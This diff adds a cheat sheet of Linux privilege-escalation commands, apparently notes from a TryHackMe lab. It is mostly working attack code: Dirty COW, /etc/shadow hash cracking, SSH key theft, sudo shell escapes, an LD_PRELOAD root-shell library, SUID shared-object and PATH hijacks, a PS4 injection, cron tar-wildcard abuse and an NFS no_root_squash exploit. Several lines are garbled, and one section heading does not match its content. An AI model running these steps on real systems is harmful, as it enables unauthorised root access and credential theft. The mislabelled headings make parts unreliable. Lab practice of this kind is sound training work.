@@ -1,0 +1,207 @@
+--Privilege Escalation - Kernel Exploits:
+
+tool : https://github.com/firefart/dirtycow
+ls
+gcc -pthread c0w.c -o cow
+./cow
+cp /tmp/bak /usr/bin/passwd
+
+--Privilege Escalation - Stored Passwords (Config Files):
+
+1. In command prompt type: cat /home/user/myvpn.ovpn
+2. In command prompt type: cat /etc/openvpn/auth.txt
+3. In command prompt type: cat /home/user/.irssi/config | grep -i passw
+
+--Privilege Escalation - Stored Passwords (History)
+
+cat ~/.bash_history | grep -i passw
+
+--Privilege Escalation - Weak File Permissions
+
+ls -la /etc/shadow
+1. In command prompt type: cat /etc/passwd
+2. In command prompt type: cat /etc/shadow
+
+unshadow /etc/passwd /etc/shadow > hashes.txt
+john --wordlist=/path/to/wordlist.txt hashes.txt
+john --show hashes.txt
+
+--Privilege Escalation - SSH Keys
+
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+nano id_rsa
+chmod 400 id_rsa
+ssh -i id_rsa username@ip
+
+--Privilege Escalation - Sudo (Shell Escaping)
+
+sudo -l
+sudo find /bin -name nano -exec /bin/sh \;
+id > whoami > which python2.6 > python2.6 -c 'import pty;pty.spawn("/bin/bash")' > exit
+sudo awk 'BEGIN {system("/bin/sh")}'
+id > whoami > exit
+echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+id > whoami > exit
+sudo vim -c '!sh'
+id > whoami > exit
+
+--Privilege Escalation - Sudo (Abusing Intended Functionality)
+
+sudo -l
+sudo apache2 -f /etc/shadow
+echo '' > hash.txt
+john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
+john hash.txt --show
+
+--Privilege Escalation — Sudo (LD_PRELOAD)
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+Save the file as x.c
+
+gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
+sudo LD_PRELOAD=/tmp/x.so apache2
+id
+
+--Privilege Escalation — SUID (Shared Object Injection)
+
+find / -type f -perm -04000 -ls 2>/dev/null
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+mkdir /home/user/.config
+cd /home/user/.config
+
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+
+Save the file as libcalc.c
+
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+
+/usr/local/bin/suid-so
+id
+
+--Privilege Escalation — SUID (Symlinks)
+
+Terminal 01:
+dpkg -l | grep nginx
+su root > password123
+su -l www-data
+/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
+
+Terminal 02:
+su root > password123
+invoke-rc.d nginx rotate >/dev/null 2>&1
+
+find / -perm -u=s -type f 2>/de/null
+
+
+--Privilege Escalation - SUID (Environment Variables #1)
+
+find / -type f -perm -04000 -ls 2>/dev/null
+strings /usr/local/bin/suid-env
+
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+gcc /tmp/service.c -o /tmp/service
+export PATH=/tmp:$PATH
+/usr/local/bin/suid-env
+id
+
+--Privilege Escalation — SUID (Environment Variables #2)
+
+Detection:
+find / -type f -perm -04000 -ls 2>/dev/null
+strings /usr/local/bin/suid-env2
+
+Exploitation Method #1:
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+export -f /usr/sbin/service
+/usr/local/bin/suid-env2
+
+Exploitation Method #2:
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
+
+--Privilege Escalation — Capabilities:
+
+Detection:
+getcap -r / 2>/dev/null
+
+Exploitation:
+/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+--Privilege Escalation — Cron (Path):
+
+Detection:
+1. In command prompt type: cat /etc/crontab
+2. From the output, notice the value of the “PATH” variable.
+
+Exploitation:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+chmod +x /home/user/overwrite.sh
+/tmp/bash -p
+id
+
+--Privilege Escalation — Cron (Wildcards):
+
+Detection:
+cat /etc/crontab
+From the output, notice the script "/usr/local/bin/compress.sh"
+cat /usr/local/bin/compress.sh
+From the output, notice the wildcard (*) used by ‘tar’.
+
+Exploitation:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=sh\ runme.sh
+/tmp/bash -p
+id
+
+--Privilege Escalation - Cron (File Overwrite):
+
+Detection:
+1. In command prompt type: cat /etc/crontab
+2. From the output, notice the script “overwrite.sh”
+3. In command prompt type: ls -l /usr/local/bin/overwrite.sh
+4. From the output, notice the file permissions.
+
+Exploitation:
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
+/tmp/bash -p
+id
+
+--Privilege Escalation — Cron (File Overwrite):
+
+Detection:
+1. In command line type: cat /etc/exports
+2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.
+
+Exploitation:
+
+Attacker VM:
+showmount -e MACHINE_IP
+mkdir /tmp/1
+mount -o rw,vers=2 MACHINE_IP:/tmp /tmp/1
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
+gcc /tmp/1/x.c -o /tmp/1/x
+chmod +s /tmp/1/x
+
+Linux VM:
+1. In command prompt type: /tmp/x
+2. In command prompt type: id
+
+https://daniel-schwarzentraub.medium.com/tryhackme-walk-through-room-linux-privesc-arena-db153469fcfd
+
